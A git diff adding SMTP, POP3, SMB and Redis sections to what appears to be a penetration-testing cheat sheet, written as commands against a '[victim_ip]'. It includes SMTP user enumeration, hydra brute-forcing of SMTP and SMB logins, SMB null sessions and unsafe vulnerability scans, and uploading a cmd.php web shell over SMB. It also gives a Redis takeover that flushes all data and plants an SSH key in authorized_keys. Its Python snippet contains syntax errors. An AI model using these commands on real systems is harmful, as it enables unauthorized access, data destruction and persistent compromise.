@@ -10,6 +10,10 @@
 - [RDP](#RDP)
 - [RPC](#RPC)
 - [SNMP](#SNMP)
+- [SMTP](#SMTP)
+- [POP3](POP3)
+- [SMB](#SMB)
+- [Redis](#Redis)
 --------------------------------------------------------------------------------------------------------------------------------
 # Amazon_S3
 
@@ -458,3 +462,239 @@ SNMP Managment Information Base (MIB) is a database contains info related to net
 - list
 - retr 1
 -------------------------------------------------------------------------------------------------------------------------------------
+# SMTP
+
+##### nc -nv [victim_ip] [smtp_port]
+- VRFY root
+- VRFY [some_user_name]
+***VRFY***: verify an email address
+***EXPN***: asks the server for the membership of mailing list
+
+##### telnet <victim_ip> <port>
+ 
+##### Metasploit
+- auxiliary/scanner/smtp/smtp_enum
+  - set rhosts <victim_ip>
+  - run
+
+##### telnet
+'''
+>telnet [victim_ip] 25
+>EHLO root
+>DATA
+>QUIT
+'''
+
+##### smtp-user-enum
+- perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
+dictionary
+ - /usr/share/wordlists/metasploit/unix_users.txt
+ - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
+
+##### nmap enumeration
+- nmap –script smtp-enum-users.nse <victim_ip>
+- nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]
+
+##### Bruteforce
+- hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V
+
+###### example python VRFY automation script 
+```python
+#!/usr/bin/python
+import socket
+import sys
+if len(sys.argv) != 2:
+  print("Usage: vrfy.py [username]"):
+  sys.exit(0)
+s=socket.socket(socket.AF_INET,
+
+socket.SOCK_STREAM)
+connect=s.connect(('[victim_ip]',25))
+banner=s.recv(1024)
+print(banner)
+s.send('VRFY'+sys.argv[1]+'\r\n')
+result=s.recv(1024)
+print(result)
+s.close()
+```
+-------------------------------------------------------------------------------------------------------------------------------------
+# POP3
+
+```
+telnet [victim_ip] [pop3_port]
+> USER username
+> PASS userpass
+> RETR 1 or 2.. etc
+```
+- dictionary: /usr/share/wordlist/fasttrack.txt
+-------------------------------------------------------------------------------------------------------------------------------------
+# SMB:
+  It's protocol for sharing files and resources. Runs on port 445 or on port 139
+  
+##### nmap:
+- ls -la /usr/share/nmap/scripts/smb*
+- nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
+- nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
+- nmap --script smb-enum-shares -p 139,445 [victim_ip]
+- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse [victim_ip]
+- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
+- nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]
+
+#### rpcclient
+- rpcclient -U "" -N [victim_ip]
+```
+  -U "" - null session
+  -N - no password
+```
+#### NetBIOS Service
+- nbtscan -r [victim_ip]
+
+##### smbmap
+  - smbmap -H <victim_ip>
+  - smbmap -H <victim_ip> -R
+  - smbmap -H <victim_ip> -u anonymous -d <directory>
+  
+  ***H***: hostname
+  ***R***: recursive, go through each directory and oyt the files
+  ***U***: username
+  
+#### smbclinet
+```
+  - smbclient \\\\[victim_ip]\\[sharename]
+  - smbclient -N -L \\\\\[victim_ip]
+  - smbclient -N -L //[victim_ip]/directory
+  - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
+ ```
+ 
+ #### smbclinet upload file
+```
+smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
+```
+ 
+#### enum4linux
+  - Share Enumeration:
+    - enum4linux-S [victim_ip]
+  - Usernames Enumeration:
+    - enum4linux -U -P [victim_ip]
+  - All Enumeration:  
+    - enum4linux -a [victim_ip]
+  - enum4linux -a  [victim_ip]
+  - enum4linux -u 'guest' -p '' -a  [victim_ip]
+    
+#### msfconsole
+  - setg rhosts 192.168.55.248
+  - use auxiliary/scanner/smb/smb_enumusers
+    - run
+  - use auxiliary/scanner/smb/smb_enumshares
+    - run
+  - use auxiliary/scanner/smb/smb_version
+    - run
+##### create a resource file
+```
+  echo 'setg rhosts 192.168.55.248' > smbscan.rc
+  echo 'use auxiliary/scanner/smb/smb_enumusers' >> smbscan.rc
+  echo 'run' >> smbscan.rc
+  echo 'use auxiliary/scanner/smb/smb_enumshares' >> smbscan.rc
+  echo 'run' >> smbscan.rc
+  echo 'use auxiliary/scanner/smb/smb_version' >> smbscan.rc
+  echo 'run' >> smbscan.rc
+  
+  msfconsole -r smbscan.rc
+```
+  
+#### Manual Inspection
+```
+if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
+echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+sleep 0.5 && echo ""
+```
+usage: ./script.sh [victim_ip]
+
+#### Checklist
+- Enumerate hostname: nmblookup -A [victim_ip]
+- List shares
+  - smbmap -H [victim_ip]
+  - echo exit | smbclient -L \\\\[victim_ip]
+  - nmap --script smb-enum-shares -p 139,445 [victim_ip]
+- Check Null Sessions
+  - smbmap -H [victim_ip]
+  - rpcclient -U "" -N [victim_ip]
+  - smbclient \\\\[victim_ip]\\[share name]
+- Check for Vulnerabilities
+  - nmap --script smb-vuln* -p 139,445 [victim_ip]
+- Overall Scan: enum4linux -a [victim_ip]
+
+#### Samba version checker 
+- (bash script)
+
+```
+#!/bin/sh
+#Author: rewardone
+#Description:
+# Requires root or enough permissions to use tcpdump
+# Will listen for the first 7 packets of a null login
+# and grab the SMB Version
+#Notes:
+# Will sometimes not capture or will print multiple
+# lines. May need to run a second time for success.
+if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
+echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+echo "" && sleep .1
+```
+- nmblookup -A [victim_ip]
+
+- enum4linux -a [victim_ip]
+
+### Null Session
+- null session and extract information
+- nbtscan -r [victim_ip]
+
+### Bruteforce
+- hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 [victim_ip] smb
+
+### SMB 7.pl (usefull script)
+- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/7.pl
+
+### references
+- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#nmap
+-------------------------------------------------------------------------------------------------------------------------------------
+# Redis:
+Data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams
+
+#### nmap
+
+#### telnet
+- telnet <victim_ip> <redis_port_usually_6379>
+
+#### Generate SSH key
+- ssh-keygen -t rsa -C <youremail>@<email_domain>
+
+### Add random data before and after our key:
+- (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+
+### Connect to redis 
+- redis-cli -h <victim_ip>
+
+### Flush keys
+- redis-cli -h <victim_ip> -p 6379 flushall
+
+### Set our keys into the database
+- cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb
+
+### Check the current folder 
+- config get dir
+
+### Change out directory
+- config set dir /<victim_user_name>/.ssh/
+
+### Change name of our file
+- set dbfilename "authorized_keys"
+
+### Save changes
+- save
+
+### Try to login into server via SSH
